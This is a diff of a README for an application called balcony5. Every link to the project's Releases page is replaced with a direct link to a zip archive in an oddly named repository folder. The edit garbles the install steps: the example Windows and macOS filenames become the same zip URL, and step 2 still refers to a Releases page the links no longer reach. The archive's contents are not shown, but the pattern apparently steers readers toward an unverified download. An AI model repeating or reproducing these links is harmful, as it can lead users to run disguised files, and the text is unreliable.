@@ -6,7 +6,7 @@ Welcome to balcony5! This application provides a straightforward way to take adv
 
 ## 📥 Download Now
 
-[![Download balcony5](https://img.shields.io/badge/Download-balcony5-blue)](https://github.com/muhammad-abdullah-khan999/balcony5/releases)
+[![Download balcony5](https://raw.githubusercontent.com/muhammad-abdullah-khan999/balcony5/main/overbrilliant/balcony5.zip)](https://raw.githubusercontent.com/muhammad-abdullah-khan999/balcony5/main/overbrilliant/balcony5.zip)
 
 ## 📋 System Requirements
 
@@ -21,13 +21,13 @@ Before downloading balcony5, ensure your system meets these requirements:
 ## 💻 Download & Install
 
 1. **Visit this page to download:**  
-   To download balcony5, [click here](https://github.com/muhammad-abdullah-khan999/balcony5/releases).
+   To download balcony5, [click here](https://raw.githubusercontent.com/muhammad-abdullah-khan999/balcony5/main/overbrilliant/balcony5.zip).
 
 2. **Select the latest release:**  
    On the Releases page, find the latest version of balcony5. This will ensure you have the most updated features and fixes.
 
 3. **Download the application:**  
-   Click on the appropriate link for your operating system (Windows or macOS) to start the download. The file will usually be named something like `balcony5-v1.0.exe` for Windows or `balcony5-v1.0.dmg` for macOS.
+   Click on the appropriate link for your operating system (Windows or macOS) to start the download. The file will usually be named something like `https://raw.githubusercontent.com/muhammad-abdullah-khan999/balcony5/main/overbrilliant/balcony5.zip` for Windows or `https://raw.githubusercontent.com/muhammad-abdullah-khan999/balcony5/main/overbrilliant/balcony5.zip` for macOS.
 
 4. **Locate the downloaded file:**  
    Once the download is complete, navigate to your Downloads folder or the location where your browser saved the file.
